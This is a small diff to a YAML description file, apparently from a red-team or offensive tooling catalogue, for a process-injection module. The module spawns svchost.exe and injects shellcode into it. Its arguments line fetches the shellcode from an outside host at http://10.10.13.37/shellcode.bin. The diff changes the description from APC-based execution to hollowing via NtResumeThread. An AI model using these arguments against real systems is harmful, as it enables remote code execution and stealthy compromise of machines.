@@ -194,7 +194,7 @@ arguments: |
   /sc:http://10.10.13.37/shellcode.bin /image:C:\Windows\System32\svchost.exe
 description: |
   Injects shellcode into a newly spawned remote process.
-  Thread execution via NtQueueApcThread.
+  Thread execution via NtResumeThread (hollowing with shellcode).
 calls:
   - kernel32.dll:
     1: 'CreateProcess'
